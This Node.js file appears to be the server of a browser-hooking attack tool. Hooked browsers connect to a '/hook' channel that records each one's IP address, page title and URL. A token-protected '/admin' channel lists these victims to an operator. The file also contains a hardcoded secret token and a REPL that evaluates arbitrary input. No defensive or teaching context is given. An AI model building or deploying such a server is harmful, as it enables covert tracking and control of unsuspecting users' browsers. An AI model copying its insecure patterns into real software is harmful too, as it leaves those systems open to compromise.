const repl = require("repl");
repl.start({
  eval: (cmd, context, filename, callback) => {
    with (context) callback(null, eval(cmd))
  }
});
const bodyParser = require('body-parser');
const express = require('express');
const app = express();
const http = require('http');
const path = require('path');
const cors = require('cors'); // Import the cors package
const PORT = 3005;
const SHA256 = require("crypto-js/sha256");
const { Socket } = require("socket.io");
const server = http.createServer(app);
const io = require('socket.io')(server, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
});
const hook = io.of("/hook");
const admin = io.of("/admin");
const TOKEN = "ZFTP-NJRM";
var admin_conn = null;
const verifyToken = (socket, next) => {
    const token = socket.handshake.auth.token;
    console.log(token)
    if (!token) {
        return next(new Error('Authentication error'));
    }
  
    const hashedToken = SHA256(TOKEN).toString();
    if (token === hashedToken) {
        next();
    } else {
        return next(new Error('Authentication error'));
    }
};


admin.use(verifyToken);
// hook.use(connect);
var users = {};


app.use(cors()); // Use the cors middleware
app.use(express.static(path.join(__dirname, 'dist')));





hook.on('connection', (socket) => {
    socket.emit("message","connected");
    
    socket.on("newHook", (data) => {
        console.log(data);
        if (Object.keys(users).includes(data.peer)) {
            console.log("Already hooked.");
            return;
        }
        users[data.peer] = {
            "sock": socket,
            "address": socket.handshake.address,
            "pageInfo": {
                "title": data.title,
                "url": data.page
            }
        };
        if (admin_conn !== null) {
            admin_conn.emit("hooks",getUsers())
        }
    })

    socket.on('disconnect', () => {
        console.log(socket.handshake.address + " disconnected")
        var pp = socket.handshake.address;
        for (i in users) {
            if (users[i].address == pp) {
                delete users[i];
                if (admin_conn !== null) {
                    admin_conn.emit("hooks",getUsers())
                }
            }
        }
    })
});

admin.on('connection', (socket) => {
    socket.emit("message","Admin connected");
    admin_conn = socket;

    socket.on('getHooks', () => {
        admin.emit("hooks",getUsers());
    });
    

    socket.on('disconnect', () => {
        console.log("Admin disconnected");
        admin_conn = null;
    });
});

function getUsers() {
    var gb = [];
    for (i in users) {
        gb.push({
            "peer": i,
            "ip": users[i].address,
            "pageInfo": users[i].pageInfo
        })
    }
    return gb;
}

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});